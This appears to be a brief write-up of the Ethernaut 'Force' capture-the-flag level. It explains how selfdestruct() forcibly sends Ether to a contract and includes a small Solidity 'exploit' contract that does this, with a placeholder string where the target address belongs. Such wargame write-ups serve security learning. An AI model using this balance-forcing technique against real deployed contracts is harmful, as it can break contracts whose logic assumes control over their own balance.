#FORCE

##Objective : send some balance to the contract.

to forcefully send ether to a contract ;selfdestruct()
All the Ether stored in the calling contract will  be transferred to the address specified. there's no way for the receiver to prevent this because this happens on the EVM level.

solution: 
deploy a contract, fund it with some Ether, and use a selfdestruct() with the address of the Ethernaut's instance

```exploit: 
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Forced{
    constructor () public payable {
        selfdestruct("instance addr");
    }
}
```

